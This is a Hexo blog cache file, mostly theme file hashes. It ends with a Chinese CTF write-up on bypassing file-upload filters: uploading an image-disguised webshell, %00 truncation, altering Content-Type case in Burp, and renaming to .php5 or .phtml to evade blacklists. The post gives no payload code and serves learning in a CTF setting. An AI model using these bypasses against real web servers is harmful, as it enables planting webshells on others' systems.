ed":1651227755010},{"_id":"themes/cactus/source/css/_highlight/tomorrow-night.styl","hash":"16ba09b2db501e4e3e2e7d62595d9bf935bf27c4","modified":1651227755011},{"_id":"themes/cactus/source/css/_highlight/tomorrow.styl","hash":"15779cf6846725c7c35fc56cac39047d7e0aec1c","modified":1651227755011},{"_id":"themes/cactus/source/css/_highlight/vs.styl","hash":"959a746f4b37aacb5d1d6ff1d57e0c045289d75d","modified":1651227755011},{"_id":"themes/cactus/source/css/_highlight/xcode.styl","hash":"5e8532ae8366dcf6a4ef5e4813dc3d42ab3d0a50","modified":1651227755011},{"_id":"themes/cactus/source/css/_partial/archive.styl","hash":"ef8fc52337c4c7b010cad7c427cb78009b30f9d8","modified":1651227755011},{"_id":"themes/cactus/source/css/_highlight/zenburn.styl","hash":"68ff9332ccc03f9389b15b713415cde016f8088f","modified":1651227755011},{"_id":"themes/cactus/source/css/_partial/categories.styl","hash":"a43f00e61b3507f130b8a3f8108a4eeca147c2a0","modified":1651227755011},{"_id":"themes/cactus/source/css/_partial/article.styl","hash":"c6a3c395ceb4aacba8c995bcde7b58a7ca501919","modified":1651227755011},{"_id":"themes/cactus/source/css/_partial/comments.styl","hash":"1e90f1fb9d4c155df518cacb5a537e9de9c042c1","modified":1651227755012},{"_id":"themes/cactus/source/css/_partial/footer.styl","hash":"14dda7f155bb21e6cd33ca3d8daa5b489b4707b3","modified":1651227755012},{"_id":"themes/cactus/source/css/_partial/index.styl","hash":"59c99f4ea3a73bf47ce030df166c5e33d5de31fb","modified":1651227755012},{"_id":"themes/cactus/source/css/_partial/pagination.styl","hash":"950bf517bbe7adb9a9aa4eb5ddec74ffc7598787","modified":1651227755012},{"_id":"themes/cactus/source/css/_partial/header.styl","hash":"519af79eb34ee922b48e6c19aa8f4856e3f76486","modified":1651227755012},{"_id":"themes/cactus/source/css/_partial/search.styl","hash":"159be002780c62a77f46947cf854a7342fba24f4","modified":1651227755012},{"_id":"themes/cactus/source/css/_partial/tags.styl","hash":"d571d5c7c960300d29c5f0ec3fe1140322ecd6b3","modified":1651227755013},{"_id":"themes/cactus/source/css/_partial/tooltip.styl","hash":"2daff581ec3efaec840cbfdee512195919c32629","modified":1651227755013},{"_id":"themes/cactus/source/lib/clipboard/clipboard.min.js","hash":"ee60ca5ba9401456105ef703a98092369b579c80","modified":1651227755018},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Black.woff","hash":"9e8d954c46eaad8b8234fa906e9a268ee354dced","modified":1651227755050},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Black.woff2","hash":"f1c5d7523d21c2bf820d827c9d5df4184c3866dc","modified":1651227755050},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Bold.woff2","hash":"8d4810991aa94f958aff20a9cd381caf338e3061","modified":1651227755052},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Bold.woff","hash":"9376516725e502f4375e06cc4fa7d940e2c93251","modified":1651227755052},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Light.woff","hash":"cba77d3d16f7565f9ea79bd7657f4e00c7fe851f","modified":1651227755053},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Light.woff2","hash":"e520d5f6bf7ea3c1e4f2aef2abbbc6a6f9b697cb","modified":1651227755053},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Medium.woff","hash":"2e8e3c873e6d98acc3c10aa84997104b276e1e68","modified":1651227755054},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Medium.woff2","hash":"976b7aa7c2c2c049c548a25b5914cfbda74b0453","modified":1651227755055},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Thin.woff2","hash":"baa42f95b41411b9aeaa6c7594e5ccee10d42ac4","modified":1651227755056},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Thin.woff","hash":"f231111b3c778b7a5898ea88c0f150c0e72be468","modified":1651227755056},{"_id":"themes/cactus/source/lib/vazir-font/Vazir.woff2","hash":"dc3c0ed67c9abb062b562e8553776f614d2946c2","modified":1651227755057},{"_id":"themes/cactus/source/lib/vazir-font/font-face.css","hash":"2a95709b15ee45fc2328051038ceedddf83235bb","modified":1651227755057},{"_id":"themes/cactus/source/lib/vazir-font/Vazir.woff","hash":"c798391d624b9bb44497a87ffc4f7eb52042dceb","modified":1651227755057},{"_id":"themes/cactus/source/lib/jquery/jquery.min.js","hash":"88523924351bac0b5d560fe0c5781e2556e7693d","modified":1651227755034},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Black.eot","hash":"603acd29416644e4b4fb8646abeada1865ba6869","modified":1651227755049},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Light.eot","hash":"32f51bf715663f5ca419e138617fc05f7055aef5","modified":1651227755052},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Medium.eot","hash":"17be9f699c30f0384004b46e991db8ac38a9992e","modified":1651227755054},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Black.ttf","hash":"23ee4a19421de9a0ca9dddc5435a8efe5bf28d87","modified":1651227755050},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Bold.eot","hash":"9ef82b07f3adad7d644c9c3a6d35a0c727bd64e8","modified":1651227755051},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Bold.ttf","hash":"658c1da4f2a0124f6340058daa6873a86e6ba4fc","modified":1651227755051},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Light.ttf","hash":"b2372b67b9519fb4fa8e05de6c0ddae56845ff79","modified":1651227755053},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Medium.ttf","hash":"31cdbcc7215d01c9dd2beb8a28f8b7a7de75b9f4","modified":1651227755054},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Thin.ttf","hash":"d53fcc2e2d6c9c77613afcd34058be1b75bb0fef","modified":1651227755056},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Thin.eot","hash":"2c0ebb336dd012da8d575cae0ee4d048b65fe6e1","modified":1651227755055},{"_id":"themes/cactus/source/lib/vazir-font/Vazir.ttf","hash":"c7a3f2f4d56c4c4ec69d395baf39b55198da0254","modified":1651227755057},{"_id":"themes/cactus/source/images/logo.png","hash":"0e3029251dfda26adee2761f71377297e8c26871","modified":1651227755017},{"_id":"themes/cactus/source/css/_partial/post/actions_mobile.styl","hash":"0d2966c1d870392476864af8ee3ba312ba30cb82","modified":1651227755012},{"_id":"themes/cactus/source/css/_partial/post/actions_desktop.styl","hash":"dc726537928fc0d7703e73c0a5e4b82ad1731d59","modified":1651227755012},{"_id":"themes/cactus/source/lib/vazir-font/Vazir.eot","hash":"bd3a7cb9eb70d36b4cfba8c5a05d234aefeefe3c","modified":1651227755056},{"_id":"themes/cactus/source/lib/font-awesome/css/all.min.css","hash":"703603273f5d5d52eb456d6385e1a68294fbd568","modified":1651227755018},{"_id":"themes/cactus/source/lib/font-awesome/webfonts/fa-regular-400.eot","hash":"3ad44eb5c276d1435408f253ca78da729a1aca90","modified":1651227755025},{"_id":"themes/cactus/source/lib/font-awesome/webfonts/fa-regular-400.ttf","hash":"114f35e6d9053caca2ef6d1e34fea3f87a59245b","modified":1651227755026},{"_id":"themes/cactus/source/lib/font-awesome/webfonts/fa-regular-400.woff","hash":"f3f0ea4847825806062a9b7a0f629671eb6b6408","modified":1651227755027},{"_id":"themes/cactus/source/lib/font-awesome/webfonts/fa-regular-400.woff2","hash":"830f8653e5f4a5331ac0b47c5701f65fe9f1bb32","modified":1651227755027},{"_id":"themes/cactus/source/lib/justified-gallery/css/justifiedGallery.min.css","hash":"92bb6e468a1db7fbd99ccb960e15e28572254263","modified":1651227755034},{"_id":"themes/cactus/source/lib/justified-gallery/js/jquery.justifiedGallery.min.js","hash":"82ab395176c927ffbb2f7c95132ee0a06cd5d64a","modified":1651227755034},{"_id":"themes/cactus/source/lib/font-awesome/webfonts/fa-brands-400.woff","hash":"91daac2bfba5e6a1a15ce44c53eab524d01c7fb0","modified":1651227755025},{"_id":"themes/cactus/source/lib/font-awesome/webfonts/fa-brands-400.woff2","hash":"f356aa2e4d9b7245985d312d3bfba180f774e3b7","modified":1651227755025},{"_id":"themes/cactus/source/lib/font-awesome/webfonts/fa-solid-900.woff2","hash":"b2c74520c3f506efbfefca867918e5ae28bd5222","modified":1651227755033},{"_id":"themes/cactus/source/lib/font-awesome/webfonts/fa-solid-900.woff","hash":"61f40daca6978e6e7ab761e748c2dd9d236c7586","modified":1651227755033},{"_id":"themes/cactus/source/lib/font-awesome/webfonts/fa-brands-400.eot","hash":"d4987ee41e0e4142d561f76b8ea8e034c4d5d9d2","modified":1651227755019},{"_id":"themes/cactus/source/lib/font-awesome/webfonts/fa-regular-400.svg","hash":"1622937e49766e21eacf4ac7065b711f0fe580e1","modified":1651227755026},{"_id":"themes/cactus/source/lib/font-awesome/webfonts/fa-brands-400.ttf","hash":"f34ee061900ecd1ed3d3fd9f8f47f4e84c6d56bf","modified":1651227755024},{"_id":"themes/cactus/source/lib/font-awesome/webfonts/fa-solid-900.eot","hash":"be6b63d528286b1be2328d871c9bae95d8d57174","modified":1651227755028},{"_id":"themes/cactus/source/lib/font-awesome/webfonts/fa-solid-900.ttf","hash":"91b40a8f284159d9fff81dc522670ef68d562682","modified":1651227755033},{"_id":"themes/cactus/source/lib/meslo-LG/MesloLGL-BoldItalic.ttf","hash":"b7d24ab1e4fad720f31a2b0cca1904ce1740d846","modified":1651227755038},{"_id":"themes/cactus/source/lib/meslo-LG/MesloLGM-BoldItalic.ttf","hash":"b542b9591fbf33925d93f0695b6e123a9f0cfd43","modified":1651227755044},{"_id":"themes/cactus/source/lib/meslo-LG/MesloLGS-BoldItalic.ttf","hash":"926035f0156cccf1b0ca507347f39bf9c510f51e","modified":1651227755046},{"_id":"themes/cactus/source/lib/meslo-LG/MesloLGL-Italic.ttf","hash":"9a23c6898b0943bd3d96c04df9a0f66e919451d8","modified":1651227755040},{"_id":"themes/cactus/source/lib/meslo-LG/MesloLGM-Italic.ttf","hash":"93ebc5098cf57a32b7b8d297681f31692c09bdfa","modified":1651227755045},{"_id":"themes/cactus/source/lib/meslo-LG/MesloLGS-Italic.ttf","hash":"9d757cc9f928fc83b2133283dd639c12b11d94ad","modified":1651227755046},{"_id":"themes/cactus/source/lib/meslo-LG/MesloLGL-Bold.ttf","hash":"34f7db59f1d023294e69976aa20b7d52b86165a4","modified":1651227755037},{"_id":"themes/cactus/source/lib/meslo-LG/MesloLGL-Regular.ttf","hash":"6c090d6bff3928fbf8a5f4104e58ed7f421aea7c","modified":1651227755042},{"_id":"themes/cactus/source/lib/meslo-LG/MesloLGM-Regular.ttf","hash":"20ce1fc7ae1254558ca044ae48283faaa58897e5","modified":1651227755045},{"_id":"themes/cactus/source/lib/meslo-LG/MesloLGS-Bold.ttf","hash":"f9918fb93d6ab6850f5d38069a999c311af78816","modified":1651227755046},{"_id":"themes/cactus/source/lib/meslo-LG/MesloLGM-Bold.ttf","hash":"58be4b7760e9a84daa81929d046f9a15c4fd1c1a","modified":1651227755043},{"_id":"themes/cactus/source/lib/meslo-LG/MesloLGS-Regular.ttf","hash":"de559f8d70d5b1ab2810597bfd0b1b9506f3ef01","modified":1651227755049},{"_id":"themes/cactus/source/lib/font-awesome/webfonts/fa-brands-400.svg","hash":"29e6c7e5a4d63d2c9563cd208456cb4f8a357868","modified":1651227755023},{"_id":"themes/cactus/source/lib/font-awesome/webfonts/fa-solid-900.svg","hash":"3a090431fdec61a25ed69b9e6f35a6656bde1595","modified":1651227755031},{"_id":"public/atom.xml","hash":"f66aa788192d959c195a50c1b137db36e92830c2","modified":1651406303178},{"_id":"public/archives/index.html","hash":"48c502be40c828a3dc2e50e198feeb5543c49ae3","modified":1651406303178},{"_id":"public/archives/2018/index.html","hash":"8e33e3ec7ac71b78d41fb3ac91d9522c08d21df3","modified":1651406303178},{"_id":"public/archives/2018/11/index.html","hash":"3a6f8bf049d9bb64594601c13d2b63e6c47c4bb9","modified":1651406303178},{"_id":"public/archives/2022/index.html","hash":"629b82c1d5a46b7d41fcf79e52260d33ed5bbfb3","modified":1651406303178},{"_id":"public/archives/2022/04/index.html","hash":"40b56401575bbb7e133a5de9a374bd5b0b9c38a6","modified":1651406303178},{"_id":"public/tags/PHP伪协议/index.html","hash":"9f0431dcafa398e34c3c0388eee1ed55bf407bbb","modified":1651406303178},{"_id":"public/tags/反序列化/index.html","hash":"1f0d110fe922b073fca46913c0cb396288768824","modified":1651406303178},{"_id":"public/tags/DVWA搭建/index.html","hash":"318187444c2fbb90a30da95843dd597f1f8822e9","modified":1651406303178},{"_id":"public/tags/lamp搭建/index.html","hash":"75a1725fa8b0fc2119367db690065070142de5ac","modified":1651406303178},{"_id":"public/tags/sqli-labs/index.html","hash":"4934f9eb9c3c7812a78f8674e1867f6e5f949eb9","modified":1651406303178},{"_id":"public/tags/端口扫描/index.html","hash":"7cb6708051a7dd2f3764cada5a92f14a1bc5344e","modified":1651406303178},{"_id":"public/tags/信息收集/index.html","hash":"5d06c70284b58b5d2b3763ea6814edb0f7126c8d","modified":1651406303178},{"_id":"public/tags/原创/index.html","hash":"c6eca8d775710bffd6b43f6112d5a9ab9c3999e1","modified":1651406303178},{"_id":"public/tags/流量分析/index.html","hash":"bc1c8674eb39fa35354d5279c77fc1deae400fd2","modified":1651406303178},{"_id":"public/PaperReading_FUDGE/index.html","hash":"5303b18b0eb00b271b7f93c125d68fc9175fabdd","modified":1651406303178},{"_id":"public/CTF中上传绕过各种姿势（未完待续……）/index.html","hash":"c927f9742cab8f0d7a83d37cf6108970e382c844","modified":1651406303178},{"_id":"public/集lamp搭建、DVWA搭建、sqli-labs搭建配置教程及常见问题解决之二/index.html","hash":"2c7c33d9205c9b90165d142098864c7edbdfdfc7","modified":1651406303178},{"_id":"public/集lamp搭建、DVWA搭建、sqli-labs搭建配置教程及常见问题解决之一/index.html","hash":"7fe9836d675a9ad563f13a5f83d6b577fa92c8f0","modified":1651406303178},{"_id":"public/记一道集PHP伪协议PHP反序列化综合运用的CTF/index.html","hash":"607d691b059719f8e2d3ba198b731c133aad90b9","modified":1651406303178},{"_id":"public/信息收集之nmap/index.html","hash":"b8099e83735b42652ec74552d6499d0d3847aaff","modified":1651406303178},{"_id":"public/USB流量分析/index.html","hash":"6ac373e022060b1dfc836f64ae25870f73ae77da","modified":1651406303178},{"_id":"public/tags/反向代理/index.html","hash":"dfb7503bba90dba36fc31790b82bbec3029fcb09","modified":1651406303178},{"_id":"public/tags/XFF/index.html","hash":"146d64f4ff8414ec03b39a9dd39bfd9be5c0bfe0","modified":1651406303178},{"_id":"public/tags/大小写绕过/index.html","hash":"bff7bede7c842ebb8119baddd56934b603ec4190","modified":1651406303178},{"_id":"public/index.html","hash":"39bbee07d0dccea0ed578b2c3061ea0812d82555","modified":1651406303178},{"_id":"public/反向代理服务器-HTTP请求头中的XFF/index.html","hash":"43a5481f6b9f379afb1017b85cbe00fde5b0df83","modified":1651406303178},{"_id":"public/images/favicon.ico","hash":"189f9842bcb79a6f8f9e8445bc8bbd773443826b","modified":1651406303178},{"_id":"public/images/favicon-192x192.png","hash":"96e6fcbbb13a5914a6131391e210eb7dfd13d692","modified":1651406303178},{"_id":"public/lib/vazir-font/Vazir-Bold.woff2","hash":"8d4810991aa94f958aff20a9cd381caf338e3061","modified":1651406303178},{"_id":"public/lib/vazir-font/Vazir-Black.woff2","hash":"f1c5d7523d21c2bf820d827c9d5df4184c3866dc","modified":1651406303178},{"_id":"public/lib/vazir-font/Vazir-Black.woff","hash":"9e8d954c46eaad8b8234fa906e9a268ee354dced","modified":1651406303178},{"_id":"public/images/apple-touch-icon.png","hash":"57e2def34682655f41a0be2d083f16765ba7858b","modified":1651406303178},{"_id":"public/lib/vazir-font/Vazir-Light.woff2","hash":"e520d5f6bf7ea3c1e4f2aef2abbbc6a6f9b697cb","modified":1651406303178},{"_id":"public/lib/vazir-font/Vazir-Bold.woff","hash":"9376516725e502f4375e06cc4fa7d940e2c93251","modified":1651406303178},{"_id":"public/lib/vazir-font/Vazir-Medium.woff2","hash":"976b7aa7c2c2c049c548a25b5914cfbda74b0453","modified":1651406303178},{"_id":"public/lib/vazir-font/Vazir-Thin.woff","hash":"f231111b3c778b7a5898ea88c0f150c0e72be468","modified":1651406303178},{"_id":"public/lib/vazir-font/Vazir-Light.woff","hash":"cba77d3d16f7565f9ea79bd7657f4e00c7fe851f","modified":1651406303178},{"_id":"public/lib/vazir-font/Vazir-Thin.woff2","hash":"baa42f95b41411b9aeaa6c7594e5ccee10d42ac4","modified":1651406303178},{"_id":"public/lib/vazir-font/Vazir.woff2","hash":"dc3c0ed67c9abb062b562e8553776f614d2946c2","modified":1651406303178},{"_id":"public/lib/vazir-font/Vazir.woff","hash":"c798391d624b9bb44497a87ffc4f7eb52042dceb","modified":1651406303178},{"_id":"public/lib/font-awesome/webfonts/fa-regular-400.ttf","hash":"114f35e6d9053caca2ef6d1e34fea3f87a59245b","modified":1651406303178},{"_id":"public/lib/vazir-font/Vazir-Medium.woff","hash":"2e8e3c873e6d98acc3c10aa84997104b276e1e68","modified":1651406303178},{"_id":"public/lib/font-awesome/webfonts/fa-regular-400.eot","hash":"3ad44eb5c276d1435408f253ca78da729a1aca90","modified":1651406303178},{"_id":"public/lib/font-awesome/webfonts/fa-regular-400.woff","hash":"f3f0ea4847825806062a9b7a0f629671eb6b6408","modified":1651406303178},{"_id":"public/lib/font-awesome/webfonts/fa-regular-400.woff2","hash":"830f8653e5f4a5331ac0b47c5701f65fe9f1bb32","modified":1651406303178},{"_id":"public/lib/vazir-font/Vazir-Light.ttf","hash":"b2372b67b9519fb4fa8e05de6c0ddae56845ff79","modified":1651406303178},{"_id":"public/lib/vazir-font/Vazir-Black.ttf","hash":"23ee4a19421de9a0ca9dddc5435a8efe5bf28d87","modified":1651406303178},{"_id":"public/lib/vazir-font/Vazir-Light.eot","hash":"32f51bf715663f5ca419e138617fc05f7055aef5","modified":1651406303178},{"_id":"public/lib/vazir-font/Vazir-Black.eot","hash":"603acd29416644e4b4fb8646abeada1865ba6869","modified":1651406303178},{"_id":"public/lib/vazir-font/Vazir-Medium.eot","hash":"17be9f699c30f0384004b46e991db8ac38a9992e","modified":1651406303178},{"_id":"public/lib/vazir-font/Vazir-Bold.eot","hash":"9ef82b07f3adad7d644c9c3a6d35a0c727bd64e8","modified":1651406303178},{"_id":"public/lib/vazir-font/Vazir-Bold.ttf","hash":"658c1da4f2a0124f6340058daa6873a86e6ba4fc","modified":1651406303178},{"_id":"public/lib/vazir-font/Vazir-Medium.ttf","hash":"31cdbcc7215d01c9dd2beb8a28f8b7a7de75b9f4","modified":1651406303178},{"_id":"public/lib/vazir-font/Vazir-Thin.ttf","hash":"d53fcc2e2d6c9c77613afcd34058be1b75bb0fef","modified":1651406303178},{"_id":"public/lib/vazir-font/Vazir.eot","hash":"bd3a7cb9eb70d36b4cfba8c5a05d234aefeefe3c","modified":1651406303178},{"_id":"public/lib/vazir-font/Vazir-Thin.eot","hash":"2c0ebb336dd012da8d575cae0ee4d048b65fe6e1","modified":1651406303178},{"_id":"public/js/main.js","hash":"584c5a69ac81a483a1c4377a2e2cf326c2795e7b","modified":1651406303178},{"_id":"public/css/rtl.css","hash":"9589fac02a34fd9084f805f801889028756bbb65","modified":1651406303178},{"_id":"public/js/search.js","hash":"62df6eeb66e002a600317a288e3f8fcd0e9c5492","modified":1651406303178},{"_id":"public/lib/vazir-font/font-face.css","hash":"2a95709b15ee45fc2328051038ceedddf83235bb","modified":1651406303178},{"_id":"public/lib/clipboard/clipboard.min.js","hash":"ee60ca5ba9401456105ef703a98092369b579c80","modified":1651406303178},{"_id":"public/lib/justified-gallery/css/justifiedGallery.min.css","hash":"92bb6e468a1db7fbd99ccb960e15e28572254263","modified":1651406303178},{"_id":"public/css/style.css","hash":"df5194c9863024a27cecc138e663a8d39e3f68e9","modified":1651406303178},{"_id":"public/lib/font-awesome/css/all.min.css","hash":"703603273f5d5d52eb456d6385e1a68294fbd568","modified":1651406303178},{"_id":"public/lib/justified-gallery/js/jquery.justifiedGallery.min.js","hash":"82ab395176c927ffbb2f7c95132ee0a06cd5d64a","modified":1651406303178},{"_id":"public/lib/jquery/jquery.min.js","hash":"88523924351bac0b5d560fe0c5781e2556e7693d","modified":1651406303178},{"_id":"public/lib/vazir-font/Vazir.ttf","hash":"c7a3f2f4d56c4c4ec69d395baf39b55198da0254","modified":1651406303178},{"_id":"public/lib/font-awesome/webfonts/fa-solid-900.woff2","hash":"b2c74520c3f506efbfefca867918e5ae28bd5222","modified":1651406303178},{"_id":"public/lib/font-awesome/webfonts/fa-brands-400.woff2","hash":"f356aa2e4d9b7245985d312d3bfba180f774e3b7","modified":1651406303178},{"_id":"public/lib/font-awesome/webfonts/fa-brands-400.woff","hash":"91daac2bfba5e6a1a15ce44c53eab524d01c7fb0","modified":1651406303178},{"_id":"public/lib/font-awesome/webfonts/fa-solid-900.woff","hash":"61f40daca6978e6e7ab761e748c2dd9d236c7586","modified":1651406303178},{"_id":"public/lib/font-awesome/webfonts/fa-brands-400.eot","hash":"d4987ee41e0e4142d561f76b8ea8e034c4d5d9d2","modified":1651406303178},{"_id":"public/lib/font-awesome/webfonts/fa-solid-900.ttf","hash":"91b40a8f284159d9fff81dc522670ef68d562682","modified":1651406303178},{"_id":"public/lib/font-awesome/webfonts/fa-regular-400.svg","hash":"1622937e49766e21eacf4ac7065b711f0fe580e1","modified":1651406303178},{"_id":"public/lib/font-awesome/webfonts/fa-brands-400.ttf","hash":"f34ee061900ecd1ed3d3fd9f8f47f4e84c6d56bf","modified":1651406303178},{"_id":"public/lib/font-awesome/webfonts/fa-solid-900.eot","hash":"be6b63d528286b1be2328d871c9bae95d8d57174","modified":1651406303178},{"_id":"public/images/logo.png","hash":"0e3029251dfda26adee2761f71377297e8c26871","modified":1651406303178},{"_id":"public/lib/meslo-LG/MesloLGL-BoldItalic.ttf","hash":"b7d24ab1e4fad720f31a2b0cca1904ce1740d846","modified":1651406303178},{"_id":"public/lib/meslo-LG/MesloLGS-BoldItalic.ttf","hash":"926035f0156cccf1b0ca507347f39bf9c510f51e","modified":1651406303178},{"_id":"public/lib/meslo-LG/MesloLGM-BoldItalic.ttf","hash":"b542b9591fbf33925d93f0695b6e123a9f0cfd43","modified":1651406303178},{"_id":"public/lib/meslo-LG/MesloLGM-Italic.ttf","hash":"93ebc5098cf57a32b7b8d297681f31692c09bdfa","modified":1651406303178},{"_id":"public/lib/meslo-LG/MesloLGS-Italic.ttf","hash":"9d757cc9f928fc83b2133283dd639c12b11d94ad","modified":1651406303178},{"_id":"public/lib/meslo-LG/MesloLGL-Italic.ttf","hash":"9a23c6898b0943bd3d96c04df9a0f66e919451d8","modified":1651406303178},{"_id":"public/lib/meslo-LG/MesloLGM-Regular.ttf","hash":"20ce1fc7ae1254558ca044ae48283faaa58897e5","modified":1651406303178},{"_id":"public/lib/meslo-LG/MesloLGL-Regular.ttf","hash":"6c090d6bff3928fbf8a5f4104e58ed7f421aea7c","modified":1651406303178},{"_id":"public/lib/meslo-LG/MesloLGM-Bold.ttf","hash":"58be4b7760e9a84daa81929d046f9a15c4fd1c1a","modified":1651406303178},{"_id":"public/lib/meslo-LG/MesloLGS-Bold.ttf","hash":"f9918fb93d6ab6850f5d38069a999c311af78816","modified":1651406303178},{"_id":"public/lib/meslo-LG/MesloLGL-Bold.ttf","hash":"34f7db59f1d023294e69976aa20b7d52b86165a4","modified":1651406303178},{"_id":"public/lib/meslo-LG/MesloLGS-Regular.ttf","hash":"de559f8d70d5b1ab2810597bfd0b1b9506f3ef01","modified":1651406303178},{"_id":"public/lib/font-awesome/webfonts/fa-brands-400.svg","hash":"29e6c7e5a4d63d2c9563cd208456cb4f8a357868","modified":1651406303178},{"_id":"public/lib/font-awesome/webfonts/fa-solid-900.svg","hash":"3a090431fdec61a25ed69b9e6f35a6656bde1595","modified":1651406303178}],"Category":[],"Data":[],"Page":[],"Post":[{"title":"CTF中上传绕过各种姿势（未完待续……）","date":"2018-11-19T20:00:00.000Z","_content":"\n之前做过的一个比较简单的文件上传，上传图片木马后，直接bp改包，利用%00截断改后缀就可以得到flag。\n\n[00截断题目](http://ctf5.shiyanbar.com/web/upload/)\n\n[00截断wp](https://blog.csdn.net/wy_97/article/details/76549405)\n\n今天遇到了一个需要绕过技巧的文件上传，所以，简单学习记录一下。\n\n[题目来自于bugku](http://120.24.86.145:8002/web9/)\n\n解决思路：首先上传一个图片木马，bp抓包后，需要修改两处：\n\n![1.png](https://i.loli.net/2021/08/11/wmRnGVW6OId7uki.png)\n\n分别对上述两处更改做一下解释：\n\n小写改为大写：类型检测大小写绕过\n\n当时做题的时候有两个地方不是很清楚，1、为什么要把小写改成大写。2、为什么会出现两个content-type，这两个又有什么区别\n\n1. 后来经大佬提点，可能是服务器端验证，也就是代码校验，很多带waf的网站，在进行文件上传的时候。改了大小写以后就可以进去，有的时候会是content-type的multipart改为Multipart，有的时候是file改为File，还有把-改为+。这些都是与后台的代码有关。\n2. 第二个问题解决的时候，查了很多的资料，但是最终都搞清楚了。\n\n简单来说，上面的就是在表单上传文件时的类型，下面的就是上传文件时的文件类型。\n\n具体的请参考：https://www.jianshu.com/p/29e38bcc8a1d\n\n后缀名改为.php5\n\n利用过滤黑名单的方式防止上传。如果直接上传phtml，绕过黑名单，phtml还被能解析成php。符合的后缀包括 php、php3、php4、php5、phtml、pht等\n\n原理：在php5.conf文件中有相关php后缀的正则，只要符合该正则的php后缀，都可以被解析。\n\n另外附上PHP文件上传过程中基于白名单、黑名单、基于MIME的认证以及目录认证的代码样例：https://blog.csdn.net/hitwangpeng/article/details/47060671\n\n另，个人认为这是比较全的上传绕过的姿势了\n\n[https://thief.one/2016/09/22/%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85/](https://thief.one/2016/09/22/上传木马姿势汇总-欢迎补充/)\n","source":"_posts/CTF中上传绕过各种姿势（未完待续……）.md","raw":"---\ntitle: CTF中上传绕过各种姿势（未完待续……）\ndate: 2018-11-20 04:00:00\ntags:\n- 大小写绕过\n---\n\n之前做过的一个比较简单的文件上传，上传图片木马后，直接bp改包，利用%00截断改后缀就可以得到flag。\n\n[00截断题目](http://ctf5.shiyanbar.com/web/upload/)\n\n[00截断wp](https://blog.csdn.net/wy_97/article/details/76549405)\n\n今天遇到了一个需要绕过技巧的文件上传，所以，简单学习记录一下。\n\n[题目来自于bugku](http://120.24.86.145:8002/web9/)\n\n解决思路：首先上传一个图片木马，bp抓包后，需要修改两处：\n\n![1.png](https://i.loli.net/2021/08/11/wmRnGVW6OId7uki.png)\n\n分别对上述两处更改做一下解释：\n\n小写改为大写：类型检测大小写绕过\n\n当时做题的时候有两个地方不是很清楚，1、为什么要把小写改成大写。2、为什么会出现两个content-type，这两个又有什么区别\n\n1. 后来经大佬提点，可能是服务器端验证，也就是代码校验，很多带waf的网站，在进行文件上传的时候。改了大小写以后就可以进去，有的时候会是content-type的multipart改为Multipart，有的时候是file改为File，还有把-改为+。这些都是与后台的代码有关。\n2. 第二个问题解决的时候，查了很多的资料，但是最终都搞清楚了。\n\n简单来说，上面的就是在表单上传文件时的类型，下面的就是上传文件时的文件类型。\n\n具体的请参考：https://www.jianshu.com/p/29e38bcc8a1d\n\n后缀名改为.php5\n\n利用过滤黑名单的方式防止上传。如果直接上传phtml，绕过黑名单，phtml还被能解析成php。符合的后缀包括 php、php3、php4、php5、phtml、pht等\n\n原理：在php5.conf文件中有相关php后缀的正则，只要符合该正则的php后缀，都可以被解析。\n\n另外附上PHP文件上传过程中基于白名单、黑名单、基于MIME的认证以及目录认证的代码样例：https://blog.csdn.net/hitwangpeng/article/details/47060671\n\n另，个人认为这是比较全的上传绕过的姿势了\n\n[https://thief.one/2016/09/22/%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85/](https://thief.one/2016/09/22/上传木马姿势汇总-欢迎补充/)\n","slug":"CTF中上传绕过各种姿势（未完待续……）","published":1,"updated":"2022-04-29T10:22:34.992Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cl2n8fso200005l9jd17k90uy","content":"<p>之前做过的一个比较简单的文件上传，上传图片木马后，直接bp改包，利用%00截断改后缀就可以得到flag。</p>\n<p><a href=\"http://ctf5.shiyanbar.com/web/upload/\" target=\"_blank\" rel=\"noopener\">00截断题目</a></p>\n<p><a href=\"https://blog.csdn.net/wy_97/article/details/76549405\" target=\"_blank\" rel=\"noopener\">00截断wp</a></p>\n<p>今天遇到了一个需要绕过技巧的文件上传，所以，简单学习记录一下。</p>\n<p><a href=\"http://120.24.86.145:8002/web9/\" target=\"_blank\" rel=\"noopener\">题目来自于bugku</a></p>\n<p>解决思路：首先上传一个图片木马，bp抓包后，需要修改两处：</p>\n<p><img src=\"https://i.loli.net/2021/08/11/wmRnGVW6OId7uki.png\" 